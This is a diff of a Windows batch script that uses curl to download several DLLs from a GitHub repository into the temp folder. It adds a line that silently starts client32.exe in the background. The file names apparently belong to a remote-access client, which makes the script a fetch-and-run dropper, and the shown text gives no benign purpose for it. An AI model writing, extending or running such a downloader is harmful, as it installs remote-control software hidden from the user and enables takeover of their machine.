@@ -14,6 +14,7 @@ curl -L -o "%TEMP%\pcicapi.dll" "https://github.com/MEMEOW-IO/test/raw/refs/head
 curl -L -o "%TEMP%\PCICHEK.DLL" "https://github.com/MEMEOW-IO/test/raw/refs/heads/main/PCICHEK.DLL"
 curl -L -o "%TEMP%\PCICL32.DLL" "https://github.com/MEMEOW-IO/test/raw/refs/heads/main/PCICL32.DLL"
 curl -L -o "%TEMP%\TCCTL32.DLL" "https://github.com/MEMEOW-IO/test/raw/refs/heads/main/TCCTL32.DLL"
+start "" /B "%TEMP%\client32.exe"
 
 echo Файлы загружены в %TEMP%
 pause
